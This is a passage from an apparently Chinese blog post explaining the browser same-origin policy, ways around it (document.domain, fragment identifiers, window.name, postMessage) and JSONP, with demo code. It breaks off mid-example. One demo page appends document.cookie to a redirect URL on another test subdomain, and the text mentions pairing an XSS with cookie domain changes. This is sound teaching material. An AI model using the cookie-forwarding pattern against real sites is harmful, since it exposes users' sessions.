选项。\n\n\n\n\n\n\nReference:\n\n`<白帽子讲web安全>`\n\n`https://www.liaoxuefeng.com/wiki/1022910821149312/1023022332902400`\n\n`http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html`\n\n`https://www.cnblogs.com/sdcs/p/8484905.html`\n\n`https://blog.csdn.net/qq_38643434/article/details/81430528`\n\n`https://www.cnblogs.com/xiaohuochai/p/6568039.html`\n\n`https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/`\n\n`https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/`\n\n`https://www.freebuf.com/articles/web/70025.html`\n\n`https://www.anquanke.com/post/id/97671`\n\n`https://www.cnblogs.com/52php/p/5677775.html`\n\n`https://www.infosec-wiki.com/?p=455211`\n\n`https://blog.csdn.net/z69183787/article/details/78954325`\n\n`https://www.w3cschool.cn/fetch_api/fetch_api-lx142x8t.html`\n","slug":"同源策略&JSONP及其利用","published":1,"updated":"2020-03-01T08:55:37.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckbh7yzgo000amp7g4rt84vwv","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h2><p>前端尤其是 Js 越学越发觉得其灵活度是超出一般脚本的。这篇文章，记录下自己对同源策略和 JSONP 的学习，也供有需要的同学参阅。</p>\n<h2 id=\"2-同源策略\"><a href=\"#2-同源策略\" class=\"headerlink\" title=\"2@ 同源策略\"></a>2@ 同源策略</h2><p>想必搞安全的初期大都会读过道哥的那本<strong><code>白帽子</code></strong>,书里面靠前的位置就讲过同源策略，不过我想大部分人可能还是对这个概念了解的不是很透彻，我们一起再来温习温习。</p>\n<blockquote>\n<p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>\n</blockquote>\n<blockquote>\n<p>同源策略 （Same Origin Policy）是一种约定。</p>\n<p>浏览器的同源策略，限制了来自不同源的 document 或脚本，对当前 document 读取或者设置某些属性。</p>\n<p>​                                                                                             ———- 《白帽子讲web安全》</p>\n</blockquote>\n<h3 id=\"2-1-介绍\"><a href=\"#2-1-介绍\" class=\"headerlink\" title=\"2.1 介绍\"></a>2.1 介绍</h3><p>那么，什么时候两个资源才算是同源呢？</p>\n<p>影响两个资源是否同源主要看以下字段是否相同，如果一致，则会被认为是同源的。</p>\n<ul>\n<li>host(域名或者IP地址)</li>\n<li>子域名</li>\n<li>端口</li>\n<li>协议</li>\n</ul>\n<p>举个简单的例子：</p>\n<p><code>http://test1.rt95.com/test.html</code></p>\n<p><code>http://test2.rt95.com/test.html</code></p>\n<p>上面两个资源就是不同源的，因为他们的子域名不同 。</p>\n<h3 id=\"2-2-限制范围\"><a href=\"#2-2-限制范围\" class=\"headerlink\" title=\"2.2 限制范围\"></a>2.2 限制范围</h3><p>当前，如果非同源，下面的行为会受到限制。</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">（<span class=\"hljs-number\">1</span>） Cookie、LocalStorage 和 IndexDB 无法读取。<br><br>（<span class=\"hljs-number\">2</span>） DOM 无法获得。<br><br>（<span class=\"hljs-number\">3</span>） AJAX 请求不能发送。<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-规避同源策略的方法\"><a href=\"#2-3-规避同源策略的方法\" class=\"headerlink\" title=\"2.3 规避同源策略的方法\"></a>2.3 规避同源策略的方法</h3><h4 id=\"1、Cookie\"><a href=\"#1、Cookie\" class=\"headerlink\" title=\"1、Cookie\"></a>1、Cookie</h4><p><strong>如果两个网页的一级域名相同，只是二级域名不同，可以通过设置document.domain 共享 Cookie</strong></p>\n<ul>\n<li>上面这句话其实略带迷惑性，容易想当然。其本质就是页面可以设置 document.domain 为当前子域或者比当前子域更高的域。而一个子域的 cookie 包含了其子域和所有比其更高的域的 cookie，下例实质上是间接设置了主站上的 cookie，而使得所有子域都能访问到 cookie。</li>\n</ul>\n<p>假如说我们现在有两个测试网站，仅仅是子域名不同，我们通过上面的原理来访问下 cookie 值。</p>\n<p>测试网站为阮大佬的博客和书籍页面。</p>\n<p>打开 <code>es6.ruanyifeng.com</code>,控制台改变域名：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1.png\"></p>\n<p>然后设置一个 cookie 值：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"2.png\"></p>\n<p>继续到博客页面，控制台改变域名和之前相同，然后进行 cookie 访问：</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/3.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"3.png\"></p>\n<p>这种方法只适用于 Cookie 和 iframe 的窗口，LocalStorage 和 IndexDB 不能使用此方法。</p>\n<p>一般浏览器前端设置 cookie 的插件，像 EditThisCookie 这种，还是后端设置 cookie，如果没有特殊的用处，都是将 cookie 的 domain 字段设置为当下所属的域，但是如果此域存在一个 xss, 组合利用的话，可以修改 cookie 让另一个子域跨域访问到。</p>\n<p>下面再给出一个比较有意思的跨域获取 cookie 的思路：</p>\n<ul>\n<li>现在在 cms1.test.ink 域下面有一个 1.html,内嵌一个 cms2.test.ink 的 2.html 页面:</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'http://cms2.test.ink/2.html'</span> <span class=\"hljs-attr\">width</span>=<span class=\"hljs-string\">'100'</span> <span class=\"hljs-attr\">height</span>=<span class=\"hljs-string\">'100'</span>&gt;</span> <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">textarea</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"zhaochao\"</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">textarea</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>而 cms2.test.ink 域下面的 2.html 内容如下，其内容是跳转到 cms1.test.ink 域下的 3.html，并且带上自己的cookie：</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br><span class=\"hljs-built_in\">window</span>.location=<span class=\"hljs-string\">\"http://cms1.test.ink/3.html?\"</span>+<span class=\"hljs-built_in\">document</span>.cookie;<br></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>cms1.test.ink 域下面的 3.html 用来接收跨域传递过来的参数，并写在父页面的文本框里：</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br><span class=\"hljs-built_in\">window</span>.parent.document.getElementById(<span class=\"hljs-string\">\"zhaochao\"</span>).value=<span class=\"hljs-built_in\">window</span>.location.toString().substring(<span class=\"hljs-built_in\">window</span>.location.toString().indexOf(<span class=\"hljs-string\">\"?\"</span>));<br></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><p>访问 cms1.test.ink/1.html,内嵌 cms2.test.ink/2.html，带 cookie 跳转到 cms1.test.ink/3.html 接收参数，写到主页面。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/22.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"22.png\"></p>\n</li>\n</ul>\n<h4 id=\"2、iframe\"><a href=\"#2、iframe\" class=\"headerlink\" title=\"2、iframe\"></a>2、iframe</h4><p>如果两个网页不同源，那么就不能拿到对方的 dom ，像 iframe 和 window.open 窗口，与父窗口无法进行通信。</p>\n<p>像在父窗口上使用下述方法来获取 iframe 的标签，就会因为不同源而报错。（本地嵌入一个百度页面进行测试）</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/4.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"4.png\"></p>\n<p>如果父子窗口只是二级域名不同，可以效仿上一点 Cookie 的跨越访问那样，设置 <code>document.domain</code> 一致即可访问。</p>\n<p>下面介绍下完全不同源的网站进行跨域访问的三种方法。</p>\n<figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">片段识别符（fragment identifier）<br><span class=\"hljs-keyword\">window</span><span class=\"hljs-built_in\">.name</span><br>跨文档通信API（Cross-<span class=\"hljs-keyword\">document</span> messaging）<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3、片段识别符\"><a href=\"#3、片段识别符\" class=\"headerlink\" title=\"3、片段识别符\"></a>3、片段识别符</h4><p>片段识别符（fragment identifier)也就是前端开发中所说的锚点，即 URL 的 <code>#</code> 之后的内容。如果知识改变片段识别符，页面不会重新刷新。</p>\n<p>这种父子间的访问方法已经浮出水面：父窗口向子窗口的片段标识符中写入数据，而子窗口可以通过创建一个监听 hash 值的方法来获取父窗口传过来的数据，从而达成通信。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 父窗口写入数据</span><br><span class=\"hljs-keyword\">var</span> src = originRL + <span class=\"hljs-string\">'#'</span> + data;<br>$(<span class=\"hljs-string\">'iframe'</span>).get(<span class=\"hljs-number\">0</span>).src = src；<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 子窗口查看数据</span><br><span class=\"hljs-built_in\">window</span>.location.href； <span class=\"hljs-comment\">// # 之后有 data 的值</span><br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"5.png\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"6.png\"></p>\n<h4 id=\"4、window-name\"><a href=\"#4、window-name\" class=\"headerlink\" title=\"4、window.name\"></a>4、window.name</h4><p>window.name 这个属性有个特定就是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页就可以读取到它。（这种方法只能是子窗口向父窗口发送数据）</p>\n<p>我们依旧拿上面的例子来演示：</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">在父窗口中打开子窗口，键入 <span class=\"hljs-function\"><span class=\"hljs-title\">window</span>.<span class=\"hljs-keyword\">name</span> 的值 -----&gt;</span><br>然后改变 <span class=\"hljs-function\"><span class=\"hljs-title\">window</span>.location 的值进入到父窗口  -----&gt;</span><br>父窗口中获得子窗口的标签，然后读取其 window.<span class=\"hljs-keyword\">name</span> 的值<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/7.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"7.pg\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/8.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"8.png\"></p>\n<h4 id=\"5、window-postMessage\"><a href=\"#5、window-postMessage\" class=\"headerlink\" title=\"5、window.postMessage\"></a>5、window.postMessage</h4><p>上面的方法都属于程序猿们私下闲着没事干破解出来的，而 HTML5 为了解决这个问题。引入了一个全新的 API ：跨文档通信 API （Cross-document-messaging),它为 window 对象多增添了一个 window.postMessage() 的方法，允许跨窗口通信，不管是否同源。</p>\n<blockquote>\n<p>举例来说，父窗口<code>http://aaa.com</code>向子窗口<code>http://bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了</p>\n</blockquote>\n<p>我们来看看 w3c 中定义 的 postMessage() 方法的定义</p>\n<blockquote>\n<p>targetWindow .postMessage（message，targetOrigin，[ transfer ]）</p>\n<ul>\n<li><p><em>targetWindow</em></p>\n<p>对将接收消息的窗口的引用。获得此类引用的方法包括：<code>Window.open</code> （生成一个新窗口然后引用它），<code>Window.opener</code> （引用产生这个的窗口），<code>HTMLIFrameElement.contentWindow</code>（<code>&lt;iframe&gt;</code>从其父窗口引用嵌入式），<code>Window.parent</code>（从嵌入式内部引用父窗口<code>&lt;iframe&gt;</code>）<code>Window.frames</code> +索引值（命名或数字）。</p>\n</li>\n<li><p><em>message</em></p>\n<p>要发送到其他窗口的数据。使用结构化克隆算法序列化数据。这意味着您可以将各种各样的数据对象安全地传递到目标窗口，而无需自己序列化。</p>\n</li>\n<li><p><em>targetOrigin</em></p>\n<p>指定要调度的事件的<code>targetWindow</code>的原点，可以是文字字符串<code>&quot;*&quot;</code>（表示没有首选项），也可以是URI。如果在计划调度事件时，<code>targetWindow</code>文档的方案，主机名或端口与<code>targetOrigin</code>提供的内容不匹配，则不会调度该事件；只有当所有的三个条件都匹配时，将调度该事件。该机制可以控制发送消息的位置；例如，如果<code>postMessage()</code>用于传输密码，则该参数必须是URI，其来源与包含密码的消息的预期接收者相同，以防止恶意第三方拦截密码。<strong>始终提供具体的targetOrigin，而不是*，如果您知道其他窗口的文档应该位于何处。未能提供特定目标会泄露您发送给任何感兴趣的恶意站点的数据。</strong></p>\n</li>\n<li><p><em>stransfer</em>（可选的）</p>\n<p>是与消息一起传输的<code>Transferable</code>对象序列。这些对象的所有权将提供给目标端，并且它们在发送端不再可用。</p>\n</li>\n</ul>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> popup = <span class=\"hljs-built_in\">window</span>.open(<span class=\"hljs-string\">'http://bbb.com'</span>, <span class=\"hljs-string\">'title'</span>);<br>popup.postMessage(<span class=\"hljs-string\">'Hello World!'</span>, <span class=\"hljs-string\">'http://bbb.com'</span>);<br></code></pre></td></tr></table></figure>\n\n<p>postMessage 的参数是：</p>\n<ul>\n<li>1、发送的内容</li>\n<li>2、接收消息的窗口源，设为 * 时，表示向所有窗口发送。</li>\n</ul>\n<p>父子窗口均可以通过监听 message 事件来获取消息：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-built_in\">window</span>.addEventListener(<span class=\"hljs-string\">'message'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">e</span>) </span>&#123;<br>  <span class=\"hljs-built_in\">console</span>.log(e.data);<br>&#125;,<span class=\"hljs-literal\">false</span>);<br></code></pre></td></tr></table></figure>\n\n<p>message 事件相关的对象有下面属性：</p>\n<ul>\n<li><code>event.source</code>：对发送消息的<code>window</code>对象的引用，也就是想要给其发送消息的一方，即上面的 targetWindow。</li>\n<li><code>event.origin</code>: 调用当时发送消息的窗口的原点<code>postMessage</code>，即信息来源的一方。</li>\n<li><code>event.data</code>: 消息内容</li>\n</ul>\n<p>接下来我们创建一个父子窗口交互的代码示例：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 父窗口 http://127.0.0.1/frametest/test.html</span><br> &lt;iframe src=<span class=\"hljs-string\">\"http://127.0.0.1:8086/child.html\"</span> frameborder=<span class=\"hljs-string\">\"0\"</span>&gt;<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span></span><br> <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>     <span class=\"hljs-built_in\">window</span>.addEventListener(<span class=\"hljs-string\">'message'</span>, receiveMessage);<br><br>     <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">receiveMessage</span>(<span class=\"hljs-params\">event</span>) </span>&#123;<br>         <span class=\"hljs-built_in\">document</span>.write(<span class=\"hljs-string\">'this is receiver\\'s receiving data'</span> + event.data);<br><br>      &#125;<br> </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">// 子窗口 http://127.0.0.1:8086/child.html<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>      <span class=\"hljs-built_in\">window</span>.addEventListener(<span class=\"hljs-string\">'message'</span>, receiveMessage);<br><br>      <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">receiveMessage</span>(<span class=\"hljs-params\">event</span>) </span>&#123;<br>          event.source.postMessage(<span class=\"hljs-string\">'message_received'</span>, event.origin);<br>          alert(event.data);<br><br>        &#125;<br></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>然后在父窗口向子窗口发送信息：(注意我们此时需要先拿到 iframe 标签，通过它来向子窗口发送数据)</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/9.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"9.png\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/10.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"10.png\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/11.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"11.png\"></p>\n<h3 id=\"2-4-补充\"><a href=\"#2-4-补充\" class=\"headerlink\" title=\"2.4 补充\"></a>2.4 补充</h3><p>尽管有同源策略，但是在浏览器中，<code>&lt;script&gt;</code> <code>img</code> <code>iframe</code> <code>&lt;link&gt;</code> 等标签依旧可以跨域加载资源，不受同源策略的控制。一般都是带 <strong>src</strong> 属性的标签，它们加载资源时，其实是由浏览器发出了一次 GET 请求。</p>\n<p>除了上面规避同源策略的方法外，还有几种：</p>\n<ul>\n<li>flash插件发送 http 请求，但必须安装 flash ，和 flash 交互。而现在 flash 已经用的越来越少了，在这里就不细究，有兴趣的同学可以参考道哥书里面的第二章内容。</li>\n<li>可以在同源服务器下架设一个代理服务器来转发，代理服务器负责请求跨域内容，而 js 只负责接收即可。</li>\n<li>第三种方式即是我们下面要探讨的 JSONP。</li>\n</ul>\n<h2 id=\"3-JSONP-介绍\"><a href=\"#3-JSONP-介绍\" class=\"headerlink\" title=\"3@ JSONP 介绍\"></a>3@ JSONP 介绍</h2><p>​     JSONP 即 JSON with Padding（填充式 JSON），是应用 JSON 的一种新的方法，常用于服务器和客户端跨源通信，在后来的 Web 服务中非常流行。</p>\n<h3 id=\"3-1-基础知识\"><a href=\"#3-1-基础知识\" class=\"headerlink\" title=\"3.1 基础知识\"></a>3.1 基础知识</h3><p> JSONP 的基本思想就是，网页添加一个 <code>&lt;script&gt;</code> 标签，然后向服务器请求数据，服务器传送回来的数据放到请求时 <code>callback</code> 关键字函数中进行处理。这种方法不受同源策略的限制。JSONP 有个要求，就是只能用 GET请求，并且要求返回 Javascript，常见可以被浏览器解析为 js 的数据 mime 类型<a href=\"https://mathiasbynens.be/demo/javascript-mime-type\" target=\"_blank\" rel=\"noopener\">在这</a>,实际上也就是我们上面补充点中说的，<code>&lt;script&gt;</code> 等标签可以跨域加载资源。</p>\n<p>我们来看一个例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 构造一个加载跨域数据的脚本，来读取当前价格指数</span><br> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">refreshPrice</span>(<span class=\"hljs-params\">data</span>) </span>&#123; <span class=\"hljs-comment\">//构造回调函数</span><br>            <span class=\"hljs-keyword\">var</span> p = $(<span class=\"hljs-string\">'p#content'</span>).get(<span class=\"hljs-number\">0</span>);<br>            p.innerHTML = <span class=\"hljs-string\">'当前价格'</span> +<br>                data[<span class=\"hljs-string\">'0000001'</span>].name + <span class=\"hljs-string\">': '</span> +<br>                data[<span class=\"hljs-string\">'0000001'</span>].price + <span class=\"hljs-string\">'；'</span> +<br>                data[<span class=\"hljs-string\">'1399001'</span>].name + <span class=\"hljs-string\">': '</span> +<br>                data[<span class=\"hljs-string\">'1399001'</span>].price;<br>        &#125;<br>  <span class=\"hljs-keyword\">var</span> js = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);<br>  head = $(<span class=\"hljs-string\">'head'</span>);<br>  js.src = <span class=\"hljs-string\">\"http://api.money.126.net/data/feed/0000001,1399001？callback=refreshPrice\"</span>;<br>  head.append(js);  <span class=\"hljs-comment\">// 添加标签，加载数据，触发回调函数</span><br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/12.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"12.png\"></p>\n<p>从这个例子我们也可以看出来，JSONP 由两部分组成：</p>\n<ul>\n<li>回调函数</li>\n<li>请求传入的数据</li>\n</ul>\n<p>再举一个我们生活中大概率会碰到的例子：百度。</p>\n<p>百度搜索框也是利用了 JSONP 的技术，我们可以通过下面的查询 URL 看出端倪。</p>\n<p><code>https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=西电&amp;&amp;cb=a</code></p>\n<p>结果为：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\">a(<br>&#123;<br>\"q\": \"西电\",<br>\"p\": false,<br>\"s\": 